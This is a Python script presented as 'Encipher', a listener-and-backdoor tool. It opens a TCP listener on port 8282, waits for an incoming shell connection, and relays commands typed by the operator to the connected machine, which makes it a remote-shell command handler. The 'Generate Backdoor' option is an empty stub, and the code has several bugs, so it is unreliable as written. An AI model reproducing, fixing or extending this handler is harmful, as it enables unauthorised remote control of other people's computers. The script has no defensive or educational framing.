#!/usr/bin/env python3

import socket
import time
import platform
import os
import sys
import keyboard
import tqdm
import subprocess


def Clear():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')
Clear()

time.sleep(3)



def Banner():
    
    print('''

                ▓█████  ███▄    █  ▄████▄   ██▓ ██▓███   ██░ ██ ▓█████  ██▀███  
                ▓█   ▀  ██ ▀█   █ ▒██▀ ▀█  ▓██▒▓██░  ██▒▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
                ▒███   ▓██  ▀█ ██▒▒▓█    ▄ ▒██▒▓██░ ██▓▒▒██▀▀██░▒███   ▓██ ░▄█ ▒
                ▒▓█  ▄ ▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██░▒██▄█▓▒ ▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  
                ░▒████▒▒██░   ▓██░▒ ▓███▀ ░░██░▒██▒ ░  ░░▓█▒░██▓░▒████▒░██▓ ▒██▒
                ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ░▒ ▒  ░░▓  ▒▓▒░ ░  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
                ░ ░  ░░ ░░   ░ ▒░  ░  ▒    ▒ ░░▒ ░      ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
                ░      ░   ░ ░ ░         ▒ ░░░        ░  ░░ ░   ░     ░░   ░ 
                ░  ░         ░ ░ ░       ░            ░  ░  ░   ░  ░   ░     
                            ░                                             ''')
    print("""       \033[94mEncipher - Listener and Backdoor Developed By Abrupt9\033[94m""")
    print()
Banner()

def Menu():
    print("""
\033[92m 1)\033[92m Start Listner                           
\033[92m 2)\033[92m Generate Backdoor
""")
    print()
Menu()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
one_two = input("[*] Enter Option 1/2: ") #Saving For Later :>

def Listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP_addr = socket.gethostbyname
    #ListenerH = '192.168.1.199' # Change this if you would like to automatically start the script without input request.
    ListenerP = 8282 # Default port
    ListenerH = input("[+] Enter Your Listener Host IP: ")
    print("[*] Creating Listener...")
    time.sleep(2)
    s.bind((ListenerH, ListenerP))
    s.listen(1)
    print("[*] Listener Created. Waiting For Connections...")
    conn, addr = s.accept()
    with conn:
        print(f"[*] New Shell Connection From:", addr)
    while True:
            Handler = input("Encipher >> ")

            if 'terminate' in Handler:
                conn.send('terminate')
                conn.close()
                break

            else:
                conn.send(Handler)
                print(conn.recv(1024))



if one_two == "1":
    Listener()

else:
    pass

if one_two == "2":
    def gen_backdoor(self):
        pass